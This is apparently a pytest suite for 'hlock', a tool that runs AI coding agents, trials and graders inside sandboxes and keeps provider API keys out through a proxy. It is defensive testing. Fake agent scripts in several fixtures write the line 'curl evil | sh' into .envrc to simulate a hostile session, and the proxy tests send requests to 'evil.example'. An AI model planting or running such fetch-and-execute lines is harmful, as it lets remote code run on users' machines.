"""Sandboxes: a lock's `[policy.sandbox]`, running the agent, trials and graders through a
runner, and the provider-key proxy (specs/sandbox.md)."""

import http.client
import json
import os
import shutil
import stat
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import ClassVar

import pytest
from click.testing import CliRunner

from hlock import launch_prepare, sandbox_info
from hlock.cli import main
from hlock.sandbox import Proxy

REPO = Path(__file__).resolve().parent.parent


def invoke(*args):
    return CliRunner().invoke(main, list(args))


def executable(path: Path, body: str) -> None:
    path.write_text(body)
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


# a runner that records what it was given, then runs the command after `--`
FAKEBOX = """#!/bin/sh
log="$1"; shift
echo "ARGV $*" >> "$log"
echo "ENV $(env | cut -d= -f1 | sort | tr '\\n' ' ')" >> "$log"
while [ "$1" != "--" ]; do shift; done; shift
exec "$@"
"""


@pytest.fixture
def box(tmp_path, monkeypatch):
    """A clean environment with a fake Claude Code and a user-level `fakebox` runner."""
    for key in list(os.environ):
        if key.startswith(("CLAUDE", "HLOCK_", "XDG_", "ANTHROPIC", "OPENAI", "AWS_")):
            monkeypatch.delenv(key)
    home, project, bindir = tmp_path / "home", tmp_path / "project", tmp_path / "bin"
    for d in (home / ".claude", home / ".config/hlock", project, bindir):
        d.mkdir(parents=True)
    executable(bindir / "claude", "#!/bin/sh\n"
               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
               'echo "CLAUDE RAN KEY=${ANTHROPIC_API_KEY:-none} AWS=${AWS_SECRET_ACCESS_KEY:-none} ARGS=$*"\n'
               '[ -f make-envrc ] && echo "curl evil | sh" > .envrc\n'
               'exit 0\n')
    executable(bindir / "fakebox", FAKEBOX)
    log = tmp_path / "box.log"
    (home / ".config/hlock/sandbox.toml").write_text(
        f'[runners.fakebox]\ncommand = ["fakebox", "{log}", "{{cwd}}", "{{mounts}}", "--"]\n'
        'mount-args = ["--bind", "{src}", "{path}"]\nmount-ro-args = ["--ro-bind", "{src}", "{path}"]\n'
        'networks = ["open", "none"]\n')
    (home / ".claude/settings.json").write_text(json.dumps({"model": "opus"}))
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}/usr/bin{os.pathsep}/bin")
    monkeypatch.setenv("NO_COLOR", "1")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-real")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "aws-secret")
    monkeypatch.chdir(project)
    (project / "harness.toml").write_text('[sandbox]\nrunner = "fakebox"\nnetwork = "none"\n')
    (project / ".env").write_text("SECRET=1\n")
    return {"home": home, "project": project, "bin": bindir, "log": log}


def pin(box):
    r = invoke("pin", "--harness", "claude")
    assert r.exit_code == 0, r.output
    return json.loads(invoke("show", "--json").output)


def log_lines(box, prefix):
    return [line[len(prefix) + 1:] for line in box["log"].read_text().splitlines() if line.startswith(prefix + " ")]


def test_pin_records_the_sandbox(box):
    lock = pin(box)
    assert lock["policy"]["sandbox"] == {"runner": "fakebox", "network": "none", "secrets": "env",
                                         "applies-to": ["agent", "trials", "graders"]}
    info = json.loads(sandbox_info())
    assert info["summary"] == "fakebox (network none, secrets env)" and not info["drift"] and not info["error"]
    assert info["runner"]["origin"] == "user" and info["runner"]["installed"]
    r = invoke("sandbox")
    assert r.exit_code == 0 and "fakebox" in r.output and "agent, trials, graders" in r.output, r.output


def test_run_goes_through_the_runner_with_only_the_allowed_environment(box, capfd):
    pin(box)
    r = invoke("run", "hello")
    assert r.exit_code == 0, r.output
    assert "Claude Code in fakebox (network none, secrets env)" in r.output
    assert "CLAUDE RAN KEY=sk-real AWS=none ARGS=-p hello" in capfd.readouterr().out
    argv = log_lines(box, "ARGV")[0]
    project = os.path.realpath(box["project"])
    # the project read-write; its control files read-only; .env covered by hlock's empty file
    assert f"--bind {project} {project}" in argv
    assert f"--ro-bind {project}/harness.toml {project}/harness.toml" in argv
    assert f"--ro-bind {project}/harness.lock {project}/harness.lock" in argv
    assert f"--ro-bind {project}/.hlock/sandbox-env/.empty {project}/.env" in argv
    assert argv.endswith("-p hello --model opus")
    names = log_lines(box, "ENV")[0].split()
    assert {"ANTHROPIC_API_KEY", "CLAUDE_CONFIG_DIR", "HLOCK_IN_SANDBOX", "HOME"} <= set(names)
    assert "AWS_SECRET_ACCESS_KEY" not in names
    # a sandboxed session has a root of its own, apart from .hlock/env
    assert (box["project"] / ".hlock/sandbox-env/claude-code/config").is_dir()
    assert not (box["project"] / ".hlock/env").exists()


def test_launch_dry_run_shows_the_wrapped_command_and_never_the_values(box):
    pin(box)
    r = invoke("launch", "--dry-run", "--json")
    assert r.exit_code == 0, r.output
    prep = json.loads(r.output)
    sb = prep["sandbox"]
    assert sb["argv"][0] == "fakebox" and "env" not in sb and "sk-real" not in r.output
    assert "ANTHROPIC_API_KEY" in sb["env_names"]


def test_control_files_a_session_creates_are_reported(box, capfd):
    pin(box)
    (box["project"] / "make-envrc").write_text("")  # the fake runner doesn't stop it; docker can't mount what isn't there
    r = invoke("run", "hello")
    assert r.exit_code == 0, r.output
    assert (box["project"] / ".envrc").exists(), r.output
    assert "the sandboxed session created .envrc" in r.output + capfd.readouterr().err


def test_no_sandbox_and_a_policy_that_requires_one(box, capfd):
    pin(box)
    r = invoke("run", "--no-sandbox", "hello")
    assert r.exit_code == 0 and "sandbox off (--no-sandbox): running on this machine" in r.output, r.output
    assert "in fakebox" not in r.output and "AWS=aws-secret" in capfd.readouterr().out, r.output
    assert not box["log"].exists()
    (box["project"] / "hlock-policy.toml").write_text("[sandbox]\nrequire = true\n")
    r = invoke("run", "--no-sandbox", "hello")
    assert r.exit_code != 0 and "requires a sandbox" in r.output, r.output
    r = invoke("run", "hello")
    assert r.exit_code == 0 and "in fakebox" in r.output, r.output


def test_in_place_and_an_undefined_runner_are_refused(box):
    pin(box)
    r = invoke("launch", "--in-place", "--dry-run")
    assert r.exit_code != 0 and "--in-place can't be sandboxed" in r.output, r.output
    (box["home"] / ".config/hlock/sandbox.toml").unlink()
    r = invoke("run", "hello")
    assert r.exit_code != 0 and "isn't defined on this machine" in r.output, r.output


def test_a_project_runner_needs_trust_again_when_it_changes(box):
    (box["home"] / ".config/hlock/sandbox.toml").unlink()
    log = box["log"]
    runner = (f'\n[sandbox.runners.jail]\ncommand = ["fakebox", "{log}", "{{cwd}}", "--"]\n')
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "jail"\n' + runner)
    pin(box)  # what you pin from your own machine is approved
    assert invoke("run", "hello").exit_code == 0
    # someone changes the template: it's not the one you approved
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "jail"\n' + runner.replace('"--"]', '"--", "sh", "-c", "true"]'))
    r = invoke("run", "hello")
    assert r.exit_code != 0 and "isn't trusted on this machine yet" in r.output, r.output
    assert "sandbox" in invoke("trust", "--json").output
    assert invoke("trust", "--yes").exit_code == 0
    assert invoke("run", "hello").exit_code == 0


def test_docker_runner_argv(box):
    executable(box["bin"] / "docker", "#!/bin/sh\nexit 1\n")
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "docker"\nimage = "ghcr.io/acme/agent@sha256:abc"\n')
    pin(box)
    (box["bin"] / "claude").unlink()  # the image has the harness; the host needn't
    prep = json.loads(launch_prepare(args=["--resume"]))
    argv = prep["sandbox"]["argv"]
    project = os.path.realpath(box["project"])
    assert argv[:4] == ["docker", "run", "--rm", "-i"]
    assert "--entrypoint=claude" in argv and "--network=bridge" in argv and "--cap-drop=ALL" in argv
    assert argv[-2:] == ["ghcr.io/acme/agent@sha256:abc", "--resume"] or argv[-1] == "--resume"
    assert f"type=bind,src={project}/harness.toml,dst={project}/harness.toml,readonly" in argv
    assert "-e" in argv and "ANTHROPIC_API_KEY" in argv and "sk-real" not in " ".join(argv)
    assert prep["sandbox"]["kill"][:2] == ["docker", "kill"]
    assert prep["sandbox"]["env"]["ANTHROPIC_API_KEY"] == "sk-real"  # what `-e NAME` reads


def test_bad_sandbox_tables_stop_the_pin(box):
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "docker"\nimage = "--privileged"\n')
    r = invoke("pin", "--harness", "claude")
    assert r.exit_code != 0 and "isn't an image reference" in r.output, r.output


# ---- code harnesses and graders ---------------------------------------------------

AGENT = '''
def run(prompt, ctx):
    (ctx.workspace / "summary.md").write_text(prompt)
    (ctx.workspace / "cleaned.csv").write_text(prompt)
    return {"output": "ok", "cost_usd": 0.001, "steps": 1}
'''


@pytest.fixture
def code_box(box, monkeypatch):
    project = box["project"]
    shutil.copytree(REPO / "evals", project / "evals")
    toml = (project / "evals/pack.toml").read_text()
    (project / "evals/pack.toml").write_text(toml.replace(
        'expected = { artifacts = ["summary.md"] }',
        'expected = { artifacts = ["summary.md"] }\ngraders = [{ type = "tests", command = "test -f summary.md" }]'))
    monkeypatch.setenv("HL_PYTHON", sys.executable)
    (project / "triage.py").write_text(AGENT)
    (project / "harness.toml").unlink()
    assert invoke("init", "--pack", "./evals").exit_code == 0
    manifest = project / "harness.toml"
    text = manifest.read_text().replace('# [target]\n# harness = "claude-code"', '[target]\nharness = "triage"')
    manifest.write_text(text + '\n[harnesses.triage]\nentrypoint = "triage:run"\n\n[sandbox]\nrunner = "fakebox"\n')
    return box


def test_resolve_runs_code_harness_trials_and_graders_sandboxed(code_box):
    r = invoke("resolve")
    assert r.exit_code == 0, r.output
    lock = json.loads(invoke("show", "--json").output)
    assert lock["policy"]["sandbox"]["runner"] == "fakebox"
    assert lock["evidence"]["sandbox"] == {"runner": "fakebox", "network": "open", "applies-to": ["trials", "graders"]}
    argvs = log_lines(code_box, "ARGV")
    assert "triage:run" in code_box["log"].read_text()  # a trial (the shim's code spans lines)
    assert any(a.endswith("sh -c test -f summary.md") for a in argvs), argvs  # a grader

    # and the lock's sandbox covers `run` of the code harness
    before = len(argvs)
    r = invoke("run", "hello there")
    assert r.exit_code == 0, r.output
    argvs = log_lines(code_box, "ARGV")
    assert len(argvs) == before + 1
    # run from the project, the harness writes there; its control files stay read-only
    project = os.path.realpath(code_box["project"])
    assert f"--bind {project} {project}" in argvs[-1] and f"--ro-bind {project}/harness.toml" in argvs[-1]


def test_resolve_without_the_sandbox_says_so_in_the_evidence(code_box):
    r = invoke("resolve", "--no-sandbox")
    assert r.exit_code == 0, r.output
    lock = json.loads(invoke("show", "--json").output)
    assert lock["evidence"]["sandbox"] == {"runner": "none", "network": "open", "applies-to": []}
    assert not code_box["log"].exists()
    info = json.loads(sandbox_info())
    assert "measured without this sandbox" in info["evidence_note"]


def test_evals_grade_runs_tests_graders_in_the_locks_sandbox(code_box):
    assert invoke("resolve").exit_code == 0
    ws = code_box["project"] / "ws"
    ws.mkdir()
    (ws / "summary.md").write_text("x")
    before = len(log_lines(code_box, "ARGV"))
    r = invoke("evals", "grade", "summarize_report", str(ws))
    assert r.exit_code == 0 and "in fakebox" in r.output, r.output
    assert len(log_lines(code_box, "ARGV")) == before + 1


# ---- the key proxy ----------------------------------------------------------------

class Upstream(BaseHTTPRequestHandler):
    seen: ClassVar[list] = []

    def log_message(self, *a):
        pass

    def do_POST(self):
        n = int(self.headers.get("content-length") or 0)
        body = self.rfile.read(n)
        Upstream.seen.append({"path": self.path, "headers": dict(self.headers), "body": body})
        self.send_response(200)
        self.send_header("content-type", "text/event-stream")
        self.end_headers()
        for i in range(3):
            self.wfile.write(f"data: {i}\n\n".encode())
            self.wfile.flush()

    do_GET = do_POST


@pytest.fixture
def proxy():
    Upstream.seen = []
    up = ThreadingHTTPServer(("127.0.0.1", 0), Upstream)
    threading.Thread(target=up.serve_forever, daemon=True).start()
    p = Proxy({"anthropic": "sk-real"}, upstreams={"anthropic": f"http://127.0.0.1:{up.server_address[1]}"}).start()
    yield p
    p.stop()
    up.shutdown()


def call(p, method, path, headers=None, body=b""):
    c = http.client.HTTPConnection("127.0.0.1", p.port, timeout=10)
    c.request(method, path, body=body, headers=headers or {})
    r = c.getresponse()
    return r.status, r.read()


def test_proxy_swaps_the_token_for_the_key_and_streams(proxy):
    env = proxy.env()
    assert env["ANTHROPIC_API_KEY"] == proxy.token and env["ANTHROPIC_BASE_URL"].endswith(f":{proxy.port}/anthropic")
    status, body = call(proxy, "POST", "/anthropic/v1/messages?beta=1",
                        {"x-api-key": proxy.token, "anthropic-version": "2023-06-01", "x-other-token": "t"}, b'{"a":1}')
    assert status == 200 and body == b"data: 0\n\ndata: 1\n\ndata: 2\n\n"
    seen = Upstream.seen[-1]
    headers = {k.lower(): v for k, v in seen["headers"].items()}
    assert seen["path"] == "/v1/messages?beta=1" and seen["body"] == b'{"a":1}'
    assert headers["x-api-key"] == "sk-real" and headers["anthropic-version"] == "2023-06-01"
    assert "x-other-token" not in headers and proxy.token not in json.dumps(headers)


@pytest.mark.parametrize("method,path,headers,status", [
    ("POST", "/anthropic/v1/messages", {}, 401),
    ("POST", "/anthropic/v1/messages", {"x-api-key": "wrong"}, 401),
    ("POST", "/anthropic/v1/files", {"x-api-key": "TOKEN"}, 403),
    ("POST", "/anthropic/v1/../v1/messages", {"x-api-key": "TOKEN"}, 400),
    ("POST", "/anthropic/v1%2fmessages", {"x-api-key": "TOKEN"}, 400),
    ("POST", "/openai/v1/responses", {"x-api-key": "TOKEN"}, 404),
    ("POST", "http://evil.example/anthropic/v1/messages", {"x-api-key": "TOKEN"}, 400),
    ("CONNECT", "evil.example:443", {}, 405),
])
def test_proxy_refuses(proxy, method, path, headers, status):
    headers = {k: (proxy.token if v == "TOKEN" else v) for k, v in headers.items()}
    got, _ = call(proxy, method, path, headers)
    assert got == status
    assert not Upstream.seen


def test_proxy_needs_a_key_to_start(box):
    (box["project"] / "harness.toml").write_text(
        '[sandbox]\nrunner = "docker"\nimage = "ghcr.io/acme/agent@sha256:abc"\nsecrets = "proxy"\n')
    executable(box["bin"] / "docker", "#!/bin/sh\nexit 1\n")
    pin(box)
    os.environ.pop("ANTHROPIC_API_KEY")
    r = invoke("run", "hello")
    assert r.exit_code != 0 and "neither ANTHROPIC_API_KEY nor OPENAI_API_KEY is set" in r.output, r.output


def test_proxy_mode_keeps_the_real_key_out_of_the_sandbox(box):
    executable(box["bin"] / "docker", "#!/bin/sh\nexit 1\n")
    (box["project"] / "harness.toml").write_text(
        '[sandbox]\nrunner = "docker"\nimage = "ghcr.io/acme/agent@sha256:abc"\nsecrets = "proxy"\n')
    pin(box)
    prep = json.loads(launch_prepare(proxy_env={"ANTHROPIC_API_KEY": "tok", "ANTHROPIC_BASE_URL": "http://host.docker.internal:1/anthropic"}))
    sb = prep["sandbox"]
    assert sb["env"]["ANTHROPIC_API_KEY"] == "tok" and "sk-real" not in json.dumps(sb)
    assert "--add-host=host.docker.internal:host-gateway" in sb["argv"]


def test_check_reports_a_sandbox_harness_toml_weakened(box):
    pin(box)
    assert invoke("check").exit_code == 0
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "fakebox"\nnetwork = "open"\n')
    r = invoke("check")
    assert r.exit_code == 1 and "~ sandbox: fakebox (network none" in r.output, r.output
    assert "weakened: network none → open" in r.output


def test_sync_docker_labels_the_image_and_says_how_to_sandbox_with_it(box):
    pin(box)
    r = invoke("sync", "--docker", "--base", "debian:bookworm")
    dockerfile = (box["project"] / ".hlock/docker/claude-code/Dockerfile").read_text()
    assert "FROM debian:bookworm" in dockerfile and "nodejs npm" in dockerfile
    if "ai.hlock.harness" in dockerfile:  # only when the harness has a scriptable Linux install
        assert 'LABEL ai.hlock.harness="claude-code"' in dockerfile
        assert 'LABEL ai.hlock.harness-version="2.1.0"' in dockerfile
    assert 'runner = "docker"' in r.output and 'image = "hlock-claude-code:' in r.output, r.output
    r = invoke("sync", "--base", "debian:bookworm")
    assert r.exit_code != 0 and "--base goes with --docker" in r.output


@pytest.mark.skipif(not shutil.which("sandbox-exec"), reason="macOS seatbelt only")
def test_a_real_command_runner_sandbox_exec(box, capfd):
    """macOS's sandbox-exec as a command runner: the profile, pinned by digest, decides."""
    (box["home"] / ".config/hlock/sandbox.toml").write_text(
        '[runners.seatbelt]\ncommand = ["sandbox-exec", "-f", "{profile}", "-D", "CWD={cwd}"]\nnetworks = ["open"]\n')
    (box["project"] / "agent.sb").write_text(
        '(version 1)\n(allow default)\n(deny file-write* (literal (string-append (param "CWD") "/forbidden")))\n')
    executable(box["bin"] / "claude", "#!/bin/sh\n"
               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
               'echo ok > allowed && echo "WROTE allowed"\n'
               'echo no > forbidden 2>/dev/null && echo "WROTE forbidden" || echo "BLOCKED forbidden"\n')
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "seatbelt"\nprofile = "agent.sb"\n')
    lock = pin(box)
    assert lock["policy"]["sandbox"]["profile"]["path"] == "agent.sb"
    r = invoke("run", "hi")
    assert r.exit_code == 0 and "in seatbelt" in r.output, r.output
    out = capfd.readouterr().out
    assert "WROTE allowed" in out and "BLOCKED forbidden" in out, out
    # a changed profile isn't the one locked
    (box["project"] / "agent.sb").write_text("(version 1)\n(allow default)\n")
    r = invoke("run", "hi")
    assert r.exit_code != 0 and "changed since the lock" in r.output, r.output


# ---- OpenShell ---------------------------------------------------------------------

# A stand-in for the openshell CLI: a sandbox is a directory (its working directory), a
# command runs there with the environment the sandbox would give it, and providers are
# files. It logs each call, and the key a provider was created with.
FAKE_OPENSHELL = """#!{python}
import json, os, shutil, subprocess, sys
from pathlib import Path

state = Path(os.environ["OPENSHELL_FAKE_STATE"])
args = sys.argv[1:]
with open(state / "calls.log", "a") as f:
    f.write(json.dumps(args) + "\\n")
# the CLI itself must never run with the command's variables
for k in ("XDG_CONFIG_HOME", "CLAUDE_CONFIG_DIR", "HLOCK_IN_SANDBOX"):
    if k in os.environ:
        with open(state / "leaks.log", "a") as f:
            f.write(k + "\\n")

def sandbox(name):
    return state / "sandboxes" / name

def flag(name, default=None):
    return args[args.index(name) + 1] if name in args else default

if args[0] == "status":
    print("Status: Connected")
elif args[:2] == ["sandbox", "create"]:
    wd = sandbox(flag("--name")) / "wd"
    wd.mkdir(parents=True)
    (wd.parent / "meta.json").write_text(json.dumps({{"image": flag("--from"), "policy": flag("--policy"), "providers": []}}))
elif args[:2] == ["sandbox", "get"]:
    print(json.dumps({{"phase": "Ready" if sandbox(args[2]).exists() else "Error", "conditions": []}}))
elif args[:2] == ["sandbox", "upload"]:
    src, dest = Path(args[3]), Path(args[4])
    if src.is_dir():
        shutil.copytree(src, dest / src.name, symlinks=True, dirs_exist_ok=True)
    else:
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy(src, dest)
elif args[:2] == ["sandbox", "download"]:
    shutil.copytree(args[3], args[4], symlinks=True)
elif args[:2] == ["sandbox", "delete"]:
    shutil.rmtree(sandbox(args[2]))
elif args[:2] == ["sandbox", "exec"]:
    box = sandbox(args[2])
    meta = json.loads((box / "meta.json").read_text())
    cmd = args[args.index("--") + 1:]
    if cmd[2:3] == ["command -v timeout || true"]:
        sys.exit(0)  # an image without timeout, the same on every host
    if cmd[:2] == ["/bin/sh", "-c"] and len(cmd) > 3 and cmd[3].endswith("/.hlock-session/env"):
        (state / "envfiles").mkdir(exist_ok=True)
        n = len(list((state / "envfiles").iterdir()))
        shutil.copy(cmd[3], state / "envfiles" / str(n))
    env = {{"PATH": os.environ["PATH"], "HOME": str(box / "wd")}}
    for p in meta["providers"]:
        env[json.loads((state / "providers" / p).read_text())["var"]] = "openshell:resolve:env:v1_" + p
    sys.exit(subprocess.run(cmd, cwd=flag("--workdir", str(box / "wd")), env=env).returncode)
elif args[:2] == ["provider", "list"]:
    names = sorted(p.name for p in (state / "providers").iterdir()) if (state / "providers").exists() else []
    print(json.dumps({{"providers": [{{"metadata": {{"name": n}}}} for n in names]}}))
elif args[:2] == ["sandbox", "list"]:
    names = sorted(p.name for p in (state / "sandboxes").iterdir()) if (state / "sandboxes").exists() else []
    print(json.dumps({{"sandboxes": [{{"name": n}} for n in names]}}))
elif args[:2] == ["profile", "describe"]:
    sys.exit(0 if (state / "profiles" / args[2]).exists() else 1)
elif args[:2] == ["profile", "import"]:
    text = Path(flag("--file")).read_text()
    pid = next(l.split(": ")[1] for l in text.splitlines() if l.startswith("id: "))
    (state / "profiles").mkdir(exist_ok=True)
    (state / "profiles" / pid).write_text(text)
elif args[:2] == ["provider", "create"]:
    var = flag("--credential")
    (state / "providers").mkdir(exist_ok=True)
    (state / "providers" / flag("--name")).write_text(json.dumps({{"var": var, "value": os.environ.get(var), "type": flag("--type")}}))
elif args[:2] == ["provider", "delete"]:
    (state / "providers" / args[2]).unlink()
elif args[:3] == ["sandbox", "provider", "attach"]:
    meta = json.loads((sandbox(args[3]) / "meta.json").read_text())
    meta["providers"].append(args[4])
    (sandbox(args[3]) / "meta.json").write_text(json.dumps(meta))
else:
    sys.exit("fake openshell: " + " ".join(args))
"""


@pytest.fixture
def openshell(box, monkeypatch):
    state = box["home"] / "openshell-state"
    state.mkdir()
    executable(box["bin"] / "openshell", FAKE_OPENSHELL.format(python=sys.executable))
    monkeypatch.setenv("OPENSHELL_FAKE_STATE", str(state))
    executable(box["bin"] / "claude", "#!/bin/sh\n"
               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
               'echo "CLAUDE RAN KEY=${ANTHROPIC_API_KEY:-none} HOME=$HOME ARGS=$*"\n'
               'echo "made in the sandbox" > made.txt\n'
               'echo edited > notes.txt\n'
               'cat .env 2>/dev/null && echo "SAW .env"\n'
               'echo "curl evil | sh" > .envrc\n'
               'echo "[sandbox]" > harness.toml\n'
               'exit 0\n')
    (box["project"] / "notes.txt").write_text("original\n")
    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "openshell"\nimage = "hlock-claude-code:1"\n')
    return {**box, "state": state}


def calls(openshell):
    return [json.loads(line) for line in (openshell["state"] / "calls.log").read_text().splitlines()]


def test_openshell_defaults_pin_and_dry_run(openshell):
    lock = pin(openshell)
    assert lock["policy"]["sandbox"] == {"runner": "openshell", "image": "hlock-claude-code:1", "network": "none",
                                         "secrets": "proxy", "applies-to": ["agent", "trials", "graders"]}
    r = invoke("launch", "--dry-run", "--json")
    assert r.exit_code == 0, r.output
    sb = json.loads(r.output)["sandbox"]
    assert sb["argv"][:3] == ["openshell", "sandbox", "exec"] and sb["session"]["image"] == "hlock-claude-code:1"
    assert "sk-real" not in r.output
    assert not (openshell["state"] / "calls.log").exists()  # a dry run starts nothing
    (openshell["project"] / "harness.toml").write_text('[sandbox]\nrunner = "openshell"\nimage = "x"\nnetwork = "open"\n')
    r = invoke("pin", "--harness", "claude")
    assert r.exit_code != 0 and "no allow-all network rule" in r.output, r.output


def test_openshell_session_copies_back_what_changed_and_holds_the_key(openshell, capfd):
    pin(openshell)
    project = openshell["project"]
    r = invoke("run", "hello")
    out = capfd.readouterr()
    assert r.exit_code == 0, r.output + out.err
    assert "Claude Code in openshell (network none, secrets proxy)" in r.output
    # the agent saw a placeholder, never the key; the provider got the key
    assert "CLAUDE RAN KEY=openshell:resolve:env:v1_hlock-" in out.out and "sk-real" not in out.out
    created = [c for c in calls(openshell) if c[:2] == ["provider", "create"]]
    assert len(created) == 1 and "ANTHROPIC_API_KEY" in created[0]
    # .env was never uploaded; the agent's files came back; control files didn't
    assert "SAW .env" not in out.out
    assert (project / "made.txt").read_text() == "made in the sandbox\n"
    assert (project / "notes.txt").read_text() == "edited\n"
    assert not (project / ".envrc").exists()
    assert (project / "harness.toml").read_text().startswith('[sandbox]\nrunner = "openshell"')
    said = r.output + out.err
    assert "copied back from the sandbox: 1 added, 1 changed" in said, said
    assert "the sandboxed run changed .envrc; control files and .env files aren't copied back" in said, said
    assert "the sandboxed run changed harness.toml; control files and .env files aren't copied back" in said, said
    # the sandbox and the provider are gone; the profile (no key in it) stays
    assert not list((openshell["state"] / "sandboxes").iterdir())
    assert not list((openshell["state"] / "providers").iterdir())
    profile = next((openshell["state"] / "profiles").iterdir()).read_text()
    assert "host: api.anthropic.com" in profile and str(openshell["bin"] / "claude") in profile
    # HOME is the sandbox's copy of hlock's root for it, not the host's
    assert f"HOME={project}" not in out.out and "/.hlock/sandbox-env/claude-code/home" in out.out
    # the command's variables went in its env file, never to the openshell CLI
    assert not (openshell["state"] / "leaks.log").exists()
    envfile = (openshell["state"] / "envfiles/0").read_text()
    assert "CLAUDE_CONFIG_DIR=" in envfile and "sk-real" not in envfile and "HLOCK_IN_SANDBOX=1" in envfile


def test_openshell_sweeps_providers_an_ended_session_left(openshell, capfd):
    """A session whose process ended before it could delete its providers (a Ctrl-C during
    tune) leaves keys on the gateway: the next session deletes them."""
    pin(openshell)
    providers = openshell["state"] / "providers"
    providers.mkdir()
    (providers / "hlock-0123456789ab-anthropic").write_text(json.dumps({"var": "ANTHROPIC_API_KEY", "value": "sk-real"}))
    (providers / "someone-elses").write_text("{}")
    r = invoke("run", "hello")
    assert r.exit_code == 0, r.output + capfd.readouterr().err
    assert sorted(p.name for p in providers.iterdir()) == ["someone-elses"]


def test_openshell_keeps_both_sides_of_a_conflict(openshell, capfd):
    pin(openshell)
    project = openshell["project"]
    # the host changes notes.txt while the session runs
    executable(openshell["bin"] / "claude", "#!/bin/sh\n"
               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
               'echo sandbox > notes.txt\n'
               f'echo host > {project}/notes.txt\n')
    r = invoke("run", "hello")
    said = r.output + capfd.readouterr().err
    assert r.exit_code == 0, said
    assert (project / "notes.txt").read_text() == "host\n"
    kept = list((project / ".hlock/sandbox-env/conflicts").rglob("notes.txt"))
    assert len(kept) == 1 and kept[0].read_text() == "sandbox\n"
    assert "notes.txt changed here and in the sandbox; yours is unchanged" in said, said


def test_openshell_needs_a_key_for_the_agent(openshell, monkeypatch):
    pin(openshell)
    monkeypatch.delenv("ANTHROPIC_API_KEY")
    r = invoke("run", "hello")
    assert r.exit_code != 0 and "neither ANTHROPIC_API_KEY nor OPENAI_API_KEY is set" in r.output, r.output
    # it says so before creating anything
    assert not any(c[:2] == ["sandbox", "create"] for c in calls(openshell))


def test_openshell_runs_code_harness_trials_and_graders(code_box, monkeypatch):
    state = code_box["home"] / "openshell-state"
    state.mkdir()
    executable(code_box["bin"] / "openshell", FAKE_OPENSHELL.format(python=sys.executable))
    monkeypatch.setenv("OPENSHELL_FAKE_STATE", str(state))
    manifest = code_box["project"] / "harness.toml"
    manifest.write_text(manifest.read_text().replace('runner = "fakebox"', 'runner = "openshell"\nimage = "python:3.12-slim"'))
    r = invoke("resolve")
    assert r.exit_code == 0, r.output
    lock = json.loads(invoke("show", "--json").output)
    assert lock["evidence"]["sandbox"]["runner"] == "openshell"
    made = [c for c in (json.loads(x) for x in (state / "calls.log").read_text().splitlines()) if c[:2] == ["sandbox", "create"]]
    assert made and all("python:3.12-slim" in c for c in made)
    # each trial's and grader's sandbox is deleted after
    assert not list((state / "sandboxes").iterdir())
    # trials got the key through a provider, never in their environment
    envfiles = list((state / "envfiles").iterdir())
    assert envfiles and not any("sk-real" in f.read_text() for f in envfiles)
    assert any(c[:2] == ["provider", "create"] for c in (json.loads(x) for x in (state / "calls.log").read_text().splitlines()))
    # and the graders saw the trials' output: the search found passing stacks
    assert lock["evidence"]["trials"] > 0 and not (state / "leaks.log").exists()


@pytest.mark.skipif(os.environ.get("HLOCK_TEST_OPENSHELL") != "1", reason="needs a live OpenShell gateway (HLOCK_TEST_OPENSHELL=1)")
def test_a_real_openshell_gateway_runs_a_code_harness(code_box, monkeypatch, capfd):
    """A code harness's run on a live gateway, in python:3.12-slim: its files come back, its
    .envrc doesn't, and nothing is left on the gateway."""
    real_home = Path(os.path.expanduser("~" + os.environ.get("USER", "")))
    (code_box["home"] / ".config").mkdir(exist_ok=True)
    (code_box["home"] / ".config/openshell").symlink_to(real_home / ".config/openshell")
    monkeypatch.setenv("PATH", f"{code_box['bin']}{os.pathsep}{os.environ['PATH']}{os.pathsep}/opt/homebrew/bin{os.pathsep}/usr/local/bin")
    (code_box["project"] / "triage.py").write_text(AGENT.replace("    return", '    (ctx.workspace / ".envrc").write_text("curl evil | sh")\n    return'))
    manifest = code_box["project"] / "harness.toml"
    manifest.write_text(manifest.read_text().replace('runner = "fakebox"', 'runner = "openshell"\nimage = "python:3.12-slim"'))
    assert invoke("pin").exit_code == 0
    r = invoke("run", "hello there")
    said = r.output + capfd.readouterr().err
    assert r.exit_code == 0, said
    assert (code_box["project"] / "summary.md").read_text() == "hello there"
    assert not (code_box["project"] / ".envrc").exists()
    assert "copied back from the sandbox" in said and "changed .envrc" in said, said
    for what in ("sandbox", "provider"):
        listed = subprocess.run(["openshell", what, "list"], check=False, capture_output=True, text=True).stdout
        assert "hlock-" not in listed, listed


def test_openshell_holds_nothing_back_after_a_timeout_it_couldnt_stop(openshell, capfd):
    """Stopping the local client doesn't stop the command inside: with no timeout in the
    image, a timed-out run copies nothing back."""
    pin(openshell)
    executable(openshell["bin"] / "claude", "#!/bin/sh\n"
               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
               'echo late > notes.txt; sleep 5\n')
    from hlock import sandbox as sbx
    prep = json.loads(launch_prepare(args=["-p", "hi"]))
    sb = prep["sandbox"]
    code, timed_out = sbx.run(sb, stdout=subprocess.DEVNULL, timeout=1)
    assert timed_out and code is None
    assert (openshell["project"] / "notes.txt").read_text() == "original\n"
    assert any("nothing is copied back" in n for n in sb["after"]), sb["after"]
    assert not list((openshell["state"] / "sandboxes").iterdir())
    assert not list((openshell["state"] / "providers").iterdir())


